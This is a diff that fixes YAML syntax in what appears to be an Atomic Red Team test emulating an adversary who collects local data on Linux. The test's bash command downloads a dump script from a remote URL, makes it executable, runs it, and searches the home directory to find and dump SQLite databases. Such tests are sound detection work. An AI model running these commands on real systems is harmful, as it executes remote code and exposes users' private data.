@@ -3,36 +3,36 @@ display_name: Data from Local System
 atomic_tests:
 
 - name: Find and dump sqlite databases (Linux)
-  description: # |
+  description: |
     An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.
   supported_platforms:
   - linux
   input_arguments:
     remote_url:
-      description # url of remote payload
-      type # Url
-      default # https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src
+      description: url of remote payload
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src
   dependencies:
-  - description # |
+  - description: |
       Check if running on a Debian based machine.
-    prereq_command # |
+    prereq_command: |
       if [ -x "$(command -v sqlite3)" ]; then echo "sqlite3 is installed"; else echo "sqlite3 is NOT installed"; exit 1; fi
       if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
       if [ -x "$(command -v strings)" ]; then echo "strings is installed"; else echo "strings is NOT installed"; exit 1; fi
-    get_prereq_command # |
+    get_prereq_command: |
       if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y binutils curl sqlite3; fi
       if grep -iq "rhel\|fedora\|centos" /usr/lib/os-release; then yum update -y && yum install -y binutils curl sqlite-devel; fi
   executor:
-    name # bash
-    elevation_required # false
-    command # |
+    name: bash
+    elevation_required: false
+    command: |
         cd $HOME
         curl -O #{remote_url}/art
         curl -O #{remote_url}/gta.db
         curl -O #{remote_url}/sqlite_dump.sh
         chmod +x sqlite_dump.sh
         find . ! -executable -exec bash -c 'if [[ "$(head -c 15 {} | strings)" == "SQLite format 3" ]]; then echo "{}"; ./sqlite_dump.sh {}; fi' \;
-    cleanup_command # |
+    cleanup_command: |
         rm -f $HOME/.art
         rm -f $HOME/gta.db
         rm -f $HOME/sqlite_dump.sh 
